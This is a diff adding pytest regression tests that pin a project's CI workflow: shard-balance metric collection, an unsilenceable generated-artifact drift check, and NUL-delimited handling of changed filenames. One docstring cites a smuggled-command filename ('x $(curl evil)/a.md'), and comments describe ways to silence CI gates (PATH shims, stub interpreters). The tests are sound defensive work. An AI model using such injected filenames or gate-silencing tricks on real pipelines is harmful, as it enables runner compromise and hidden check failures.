@@ -2127,6 +2127,10 @@ def test_report_does_not_launder_a_failed_collector(monkeypatch):
     assert report["fast_files_unclassified"] is mt.UNKNOWN
     assert report["durations_map"]["sampled_keys"] is mt.UNKNOWN
     assert report["shard_imbalance_minutes"] is mt.UNKNOWN
+    # #6135: the newly surfaced critical-path metric must not be laundered
+    # either — a failed collector leaves it UNKNOWN, not 0.
+    assert report["max_shard_minutes"] is mt.UNKNOWN
+    assert report["shard_count"] is mt.UNKNOWN
     assert report["legs"] is mt.UNKNOWN
     assert report["diverged"] is None
 
@@ -3602,6 +3606,10 @@ def test_job_wall_seconds_defers_to_the_jobs_api_timestamps():
 def test_collect_shard_balance_uses_observed_wall_time(monkeypatch):
     import ci_timing
 
+    # #6135: the collector refuses a family that is not the CONFIGURED shard
+    # set, so this unit test states the set it is exercising (two legs) rather
+    # than depending on the repo's current `fast_shards`.
+    monkeypatch.setattr(mt, "_configured_shard_set", lambda: {"a", "b"})
     monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
     monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
         {"name": "test (a)", "conclusion": "success",
@@ -3622,6 +3630,7 @@ def test_collect_shard_balance_uses_observed_wall_time(monkeypatch):
 def test_collect_shard_balance_requires_both_legs(monkeypatch):
     import ci_timing
 
+    monkeypatch.setattr(mt, "_configured_shard_set", lambda: {"a", "b"})
     monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
     monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
         {"name": "test (a)", "conclusion": "success",
@@ -3629,6 +3638,57 @@ def test_collect_shard_balance_requires_both_legs(monkeypatch):
          "completed_at": "2026-09-27T16:36:30Z"},
     ])
     assert mt.collect_shard_balance() == {}
+
+
+def test_collect_shard_balance_refuses_a_partial_family(monkeypatch):
+    """#6135: a truncated Jobs-API read must be UNKNOWN, not a measurement
+    taken over 2 of the configured 9 shards (that under-reports max(shard))."""
+    import ci_timing
+
+    monkeypatch.setattr(mt, "_configured_shard_set", lambda: set("abcdefghi"))
+    monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
+    monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
+        {"name": "test (a)", "conclusion": "success",
+         "started_at": "2026-09-27T16:00:00Z",
+         "completed_at": "2026-09-27T16:36:30Z"},
+        {"name": "test (b)", "conclusion": "success",
+         "started_at": "2026-09-27T16:00:00Z",
+         "completed_at": "2026-09-27T16:26:47Z"},
+    ])
+    assert mt.collect_shard_balance() == {}
+
+
+def test_collect_shard_balance_fails_closed_when_config_is_unreadable(monkeypatch):
+    """#6135: an UNREADABLE config must not skip the completeness check — that
+    would measure whatever page of jobs was fetched and under-report max(shard)
+    in exactly the degraded environment the guard exists for."""
+    import ci_timing
+
+    monkeypatch.setattr(mt, "_configured_shard_set", lambda: None)
+    monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
+    monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
+        {"name": "test (a)", "conclusion": "success",
+         "started_at": "2026-09-27T16:00:00Z",
+         "completed_at": "2026-09-27T16:36:30Z"},
+        {"name": "test (b)", "conclusion": "success",
+         "started_at": "2026-09-27T16:00:00Z",
+         "completed_at": "2026-09-27T16:26:47Z"},
+    ])
+    assert mt.collect_shard_balance() == {}
+
+
+def test_shard_balance_check_requires_every_observed_leg_green():
+    """#6135: the check must not validate two of nine shards. A 9-leg payload
+    with a red shard outside a/b is a coverage failure, not a pass."""
+    def leg(c):
+        return {"conclusion": c, "wall_seconds": 300.0}
+    nine = {ch: leg("success") for ch in "abcdefghi"}
+    ok = {"shard_imbalance_minutes": 0.0, "legs": nine}
+    assert mt.run_check("shard-balance", json=ok, max=3) == 0
+    red_i = dict(ok, legs=dict(nine, i=leg("failure")))
+    assert mt.run_check("shard-balance", json=red_i, max=3) == 2
+    red_c = dict(ok, legs=dict(nine, c=leg("skipped")))
+    assert mt.run_check("shard-balance", json=red_c, max=3) == 2
 
 
 def test_diverged_duration_keys_flags_only_observed_overshoot():
@@ -3833,6 +3893,303 @@ def test_docs_job_main_health_uses_a_safe_post_merge_gate():
     # A link-free markdown file is legitimate: the action's failIfEmpty default
     # (true) would red the nightly on common prose-only commits.
     assert link["with"].get("failIfEmpty") is False
+
+
+def test_docs_job_guards_tracked_generated_artifacts_on_every_pr():
+    """#4454: a docs-only PR never runs the matrix, so a TRACKED generated
+    artifact was unguarded from the one direction that can stale it.
+
+    ``docs/`` and ``tools/`` are in NON_PYTHON_PREFIXES, so editing only
+    ``docs/product/bridge-table.md`` selects ``surfaces: []`` and
+    ``tests/test_bridge_table.py`` never runs. PR #4177 closed the generator-only
+    direction; the generated OUTPUT was left open.
+
+    The step must live in the ``docs`` job specifically. That job is a REQUIRED
+    context and carries no ``paths:`` filter, so it is the one place the check
+    cannot inherit the very skip it is closing. A path-gated home would reproduce
+    the #2802 shape, where a repo-wide gate was invisible to every gate and
+    shipped to main twice.
+    """
+    workflow = _load_workflow("ci.yml")
+    # Preconditions, read from the RECORDED source rather than a literal in this
+    # file: if the host job stops being required, or gains a paths: filter, the
+    # step below silently stops blocking anything. Asserting membership of a
+    # constant defined a few lines up would be self-satisfying and would say
+    # nothing about branch protection.
+    recorded = _json.loads(
+        (ROOT / "docs" / "ci" / "required-contexts.json").read_text()
+    )
+    assert "docs" in recorded["required_contexts"], (
+        "the docs job must be a REQUIRED context for this gate to block a merge"
+    )
+    # The trigger must be PRESENT and UNFILTERED. `.get("pull_request")` returns
+    # None both for `pull_request: {}` (the real config) and for the trigger
+    # being absent entirely, so `is None or "paths" not in ...` passes when the
+    # workflow has no PR trigger at all — pinning nothing (found in review).
+    on_block = _on_block(workflow)
+    assert "pull_request" in on_block, (
+        "ci.yml must retain a pull_request trigger, or the docs job reports "
+        "nothing and this required context blocks every merge"
+    )
+    assert not (on_block["pull_request"] or {}).get("paths"), (
+        "the docs job must run on EVERY pull_request, or this check inherits "
+        "the docs-PR skip it exists to close"
+    )
+    steps = workflow["jobs"]["docs"]["steps"]
+
+    def _code(spec: dict) -> str:
+        # Comments are not invocations: a `#`-prefixed command still contains the
+        # substring, so a bare substring assertion passes on a COMMENTED-OUT
+        # check and the pin reports a guard that does not run. Same intent as
+        # `_code` in tests/test_ci_selection.py.
+        return "\n".join(
+            line
+            for line in (spec.get("run") or "").splitlines()
+            if not line.strip().startswith("#")
+        )
+
+    step = next(
+        s for s in steps
+        if str(s.get("name", "")).startswith("Generated-artifact drift check")
+    )
+    code = _code(step)
+    # EXACTLY ONE step may carry the invocations. A `next(...)` lookup happily
+    # accepts a decoy step with the right name while the real one is disabled.
+    matching = [s for s in steps if "tools/bridge_table.py --check" in _code(s)]
+    assert len(matching) == 1, (
+        f"exactly one step may run the drift checks; found {len(matching)} — a "
+        "second step carrying the same command can hide a disabled real step, "
+        "and a bare `next(...)` lookup would accept the decoy"
+    )
+    # THE INVOCATION IS EXACT, not a membership test. This is the sibling idiom
+    # already enforced for the other required gates (tests/test_ci_selection.py
+    # asserts `run.strip() == expected`): a trailing `|| true`, `; true`,
+    # `2>/dev/null || :`, `| true`, `&`, a `set +e` wrapper, or an `echo`
+    # containing the command all satisfy a MEMBERSHIP test while making a REAL
+    # failure report green — the #2656/#5373 silencing idiom, and the exact class
+    # this PR exists to close. Measured before this assertion: `|| true` and
+    # `echo "...--check"` both left BOTH pins GREEN. Filtering comments first
+    # (above) means exactness also rules out a commented-out command.
+    expected = (
+        "pip install -e . --quiet\n"
+        "python3 tools/bridge_table.py --check\n"
+        "python3 tools/mcp_rename_table.py --check\n"
+        "python3 tools/sdk_surface.py --check"
+    )
+    assert code.strip() == expected, (
+        "the drift step must invoke EXACTLY the installer plus the three "
+        "`--check` commands — no shell operator, no wrapper, no trailing "
+        f"anything, or a real failure reports green (#2656); got {code!r}"
+    )
+    # The step may carry only the keys that cannot silence it. Enumerating the
+    # silencing keys one at a time is what left the next one open, so the rule is
+    # an ALLOW-list instead: `if:`/`continue-on-error:` skip a real failure,
+    # `shell:` swallows its exit code, `working-directory:` can point at a stub
+    # `tools/` tree, and `env:` (a PATH shim) shadows `python3` so the real
+    # `--check` never runs. `id:` and `timeout-minutes:` are allowed because they
+    # neither skip nor mask the step (the sibling gate at
+    # tests/test_ci_selection.py:3022 is the enumerated-but-`if`-allowed form;
+    # measured GREEN on the enumerated form here for a step-level
+    # `env: {PATH: ...}` shim and a job-level `defaults.run.working-directory`).
+    _allowed_step_keys = {"name", "run", "id", "timeout-minutes"}
+    _extra_keys = sorted(set(step) - _allowed_step_keys)
+    assert not _extra_keys, (
+        f"the drift step may carry only {sorted(_allowed_step_keys)}; found "
+        f"{_extra_keys}. Any other Actions step key is a silencing vector (#2656)"
+    )
+    docs_job = workflow["jobs"]["docs"]
+    for scope, label in ((workflow, "ci.yml"), (docs_job, "the docs job")):
+        _run_defaults = (scope.get("defaults") or {}).get("run") or {}
+        for key in ("shell", "working-directory"):
+            assert not _run_defaults.get(key), (
+                f"a `defaults.run.{key}` on {label} can swallow the drift check's "
+                "exit code or run it against a stub tree (#2656)"
+            )
+        # Neither of these is a key ON the drift step, so the allow-list above
+        # cannot see them, and each shims `python3` for the whole scope beneath it.
+        assert "if" not in scope, (
+            f"an `if:` on {label} can skip the guard entirely — the `docs` job is a "
+            "REQUIRED context and a skipped job never runs the `--check`s (#2656)"
+        )
+        assert not scope.get("env"), (
+            f"an `env:` on {label} can shim PATH for every step beneath it — "
+            "including the drift check (#2656)"
+        )
+        assert "container" not in scope, (
+            f"a `container:` on {label} replaces the image the `--check`s run in; "
+            "with a doctored image they pass vacuously and the drift step's own "
+            "shape stays clean (#2656)"
+        )
+    # A sibling step can install the shim without touching the drift step:
+    # appending a directory holding an `exit 0` stub named `python3` to
+    # `$GITHUB_PATH` leaves the drift step's own shape pristine. This scan reds
+    # on that edit, and on any sibling `$GITHUB_PATH`/`$GITHUB_ENV` write. It
+    # does not detect an obfuscated token build, a stub interpreter written to
+    # /usr/local/bin, or a generator overwritten under `tools/` — measured GREEN.
+    _shim_writers = sorted(
+        str(s.get("name") or s.get("uses") or "<unnamed>")
+        for s in docs_job.get("steps") or []
+        if s is not step
+        and (
+            "GITHUB_PATH" in _code(s) or "GITHUB_ENV" in _code(s)
+        )
+    )
+    assert not _shim_writers, (
+        f"a sibling step writes `$GITHUB_PATH`/`$GITHUB_ENV` (found: "
+        f"{_shim_writers}) — appending a shim directory makes `python3` resolve "
+        "to a stub that exits 0, leaving the drift step's own shape clean (#2656)"
+    )
+    # A job-level `continue-on-error` silences the whole job (and so the required
+    # context); `needs:` is subtler and worse — an upstream failure SKIPS the job
+    # rather than failing it, so the guard never runs and the required context is
+    # never reported (#2656).
+    assert not workflow["jobs"]["docs"].get("continue-on-error"), (
+        "a job-level continue-on-error on `docs` would let a failing drift check "
+        "report success (#2656)"
+    )
+    _needs = workflow["jobs"]["docs"].get("needs") or []
+    assert not (_needs if isinstance(_needs, list) else [_needs]), (
+        "the `docs` job must have no `needs:` — an upstream failure would SKIP "
+        "the guard instead of failing it (#2656)"
+    )
+    # The generators import `tortoise.sdk`, which pulls the full declared
+    # dependency set (numpy, prometheus_client, fastmcp). Without the package
+    # install both commands abort at IMPORT time and the step exits 1 on EVERY
+    # PR — a fail-always gate that reds this required context and blocks all
+    # merges. Installing only the obvious `pyyaml` is the mistake this pins.
+    assert "pip install -e ." in code, (
+        "the step must install the package; the generators import tortoise.sdk "
+        "and abort on missing runtime deps otherwise"
+    )
+    # `--check` verifies and exits non-zero on drift. A bare invocation would
+    # REWRITE the artifact and always pass — the check would look present and
+    # never fire, which is worse than absent. Exactness above already forces the
+    # `--check` form, so these are the artifact-identity assertions.
+    #
+    # Every LISTED artifact is a TRACKED generated file whose `--check` re-renders
+    # and exits non-zero on drift. Verified against a positive control per tool:
+    # injecting a line into the artifact it owns makes that tool exit 1, and
+    # `sdk_surface.py` additionally owns the tracked `config/sdk-surface.json`.
+    for tool in ("bridge_table", "mcp_rename_table", "sdk_surface"):
+        assert f"tools/{tool}.py --check" in code, (
+            f"{tool} writes a TRACKED generated artifact and must be verified"
+        )
+    # Both generators carry the #5128 >=3.12 runtime guard, so the step must
+    # bring its own interpreter rather than inherit the runner default — on an
+    # older default the guard exits EXIT_USAGE and reds the job for a reason
+    # that has nothing to do with the artifact.
+    setup = next(
+        s for s in steps if str(s.get("uses", "")).startswith("actions/setup-python")
+    )
+    assert setup["with"]["python-version"] == "3.12"
+    # Negative control: `sdk_rename_table.py --check` is deliberately NOT listed.
+    # Its output `docs/product/sdk-rename-table.md` is untracked (.gitignore:112), so
+    # in a clean checkout a bare `--check` has no file to compare and exits 1 on
+    # EVERY run — a fail-always gate, not a drift gate (measured: with that output
+    # absent, the command exits 1). Its tracked-input validation is reachable only
+    # via `--out` to a rendered copy, which `tests/test_sdk_rename_table.py` does.
+    assert "sdk_rename_table" not in code
+
+
+def test_docs_job_pr_path_never_interpolates_filenames():
+    """#4449: the PR path's changed-markdown list is DATA, never shell text.
+
+    The main-health path was fixed and pinned by
+    ``test_docs_job_main_health_uses_a_safe_post_merge_gate``. The PR path kept
+    ``${{ steps.changed.outputs.files }}`` interpolated into a ``run:`` AND into
+    lychee's ``args:``, and it stayed unreachable only because the PR checkout
+    was SHALLOW: with no ``github.event.pull_request.base.sha`` in the object
+    store the ``git diff`` failed, ``|| true`` swallowed it, the list came out
+    empty, and both consuming steps were skipped. That is an accident of the
+    checkout depth, not a control (#4449). Deepen the checkout and a list of
+    PR-AUTHOR-CONTROLLED filenames reaches a shell, where a path like
+    ``x $(curl evil)/a.md`` executes on the runner — including on a fork PR.
+
+    Both arms are pinned: the list is produced NUL-delimited into a FILE, and
+    each consumer reads that file (``xargs -0`` / ``--files-from``) instead of
+    receiving interpolated text.
+    """
+    steps = _load_workflow("ci.yml")["jobs"]["docs"]["steps"]
+
+    changed = next(s for s in steps if s.get("id") == "changed")
+    run = changed["run"]
+
+    def _logical(startswith: str) -> str:
+        """The shell logical line beginning with ``startswith``, comments stripped.
+
+        Assertions must target a SPECIFIC command: matching the whole ``run``
+        block lets an UNRELATED occurrence satisfy them, which is not a pin.
+        Measured on an earlier revision of this test — a bare ``"-z" in run``
+        was satisfied by the ``sed -z`` two lines later, and a bare
+        ``"|| true" in run`` by the ``grep -c . ... || true`` in the count
+        line, so deleting ``-z`` or the tolerance from the ``git diff`` left
+        the whole suite green. Command continuations (``\``) are joined.
+        """
+        code = [ln for ln in run.splitlines() if not ln.lstrip().startswith("#")]
+        for i, ln in enumerate(code):
+            if ln.strip().startswith(startswith):
+                parts, j = [], i
+                while j < len(code):
+                    parts.append(code[j].strip())
+                    if not code[j].rstrip().endswith("\\"):
+                        break
+                    j += 1
+                return " ".join(parts)
+        raise AssertionError(f"no shell command beginning {startswith!r} in run block")
+
+    diff_cmd = _logical("git diff")
+    # NUL-delimited output on the DIFF ITSELF (not the `sed -z` below it).
+    assert "-z" in diff_cmd, diff_cmd
+    assert "--name-only" in diff_cmd, diff_cmd
+    # Only paths that exist on disk: lychee hard-errors on a nonexistent input,
+    # and under `--no-renames` a rename contributes its deleted source path.
+    assert "--diff-filter ACMR" in diff_cmd, diff_cmd
+    # The tolerance, asserted ON THIS COMMAND. `docs` is a REQUIRED status
+    # check and a shallow PR checkout has no base sha, so without it git exits
+    # 128, the step aborts under `bash -e`, and every PR reds.
+    assert "|| :" in diff_cmd or diff_cmd.rstrip().endswith("|| true"), diff_cmd
+    assert "$RUNNER_TEMP/pr-md.raw.nul" in diff_cmd, diff_cmd
+
+    # The list is never published as step-output TEXT (a later `${{ ... }}`
+    # would re-parse the filenames as shell).
+    assert 'echo "files=' not in run, (
+        "the PR path must not publish the filenames as step OUTPUT text: a "
+        "later `${{ steps.changed.outputs.files }}` re-parses them as shell"
+    )
+    count_cmd = _logical("count=")
+    assert "pr-md.txt" in count_cmd, count_cmd
+
+    lint = next(
+        s for s in steps if str(s.get("name", "")) == "Markdownlint (changed files)"
+    )
+    assert "xargs -0" in lint["run"], (
+        "markdownlint must consume the NUL list as ARGV, not as expanded text"
+    )
+    assert "steps.changed.outputs.files" not in lint["run"]
+    assert "${{ steps.changed" not in lint["run"]
+
+    link = next(
+        s for s in steps if str(s.get("name", "")) == "Link check (changed files)"
+    )
+    assert "--files-from" in link["with"]["args"], (
+        "lychee must read the list from a FILE"
+    )
+    assert "steps.changed.outputs.files" not in link["with"]["args"]
+    assert "${{ steps.changed" not in link["with"]["args"]
+    # A link-free markdown file is legitimate.
+    assert link["with"].get("failIfEmpty") is False
+
+    # Both consumers must ALSO be guarded on the PR path: the main-health path
+    # sets no `changed` output, so an unguarded `count != '0'` would be TRUE on
+    # an empty count and run the step on the nightly with no list.
+    for step in (lint, link):
+        cond = str(step.get("if", ""))
+        assert "!inputs.main_health" in cond, (
+            f"{step.get('name')!r} must stay on the PR path only"
+        )
+        assert "count" in cond, (
+            f"{step.get('name')!r} must gate on the produced list, not on `files`"
+        )
 
 
 def test_main_health_nightly_calls_ci_yml_and_never_gates_main():
